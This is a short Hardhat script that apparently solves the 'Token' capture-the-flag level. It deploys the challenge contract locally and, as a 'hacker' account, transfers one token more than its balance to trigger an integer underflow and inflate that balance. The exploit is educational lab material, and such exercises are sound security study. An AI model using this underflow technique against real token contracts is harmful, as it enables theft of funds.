import { ethers, getNamedAccounts } from 'hardhat';

import deployContract from '../deploy/05-token';

const INSTANCE_CONTRACT_NAME = 'Token';

async function main() {
  console.log(`Passing ${INSTANCE_CONTRACT_NAME} challenge...`);

  const { hacker: hackerAddress } = await getNamedAccounts();
  const hacker = await ethers.getSigner(hackerAddress);

  const contractAddress = await deployContract();
  const contractInstance = await ethers.getContractAt(INSTANCE_CONTRACT_NAME, contractAddress);
  const contract = contractInstance.connect(hacker);

  const initialHackerBalance = await contract.balanceOf(hacker);
  console.log('Initial hacker balance is: ', initialHackerBalance);

  const amountToTransfer = initialHackerBalance + 1n;
  await contract.transfer(ethers.ZeroAddress, amountToTransfer);
  console.log(`Sending ${amountToTransfer} tokens to zero address...`);

  const newHackerBalance = await contract.balanceOf(hacker);
  console.log('New hacker balance is: ', newHackerBalance);

  console.log('Well done, You have completed this level!!!');
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
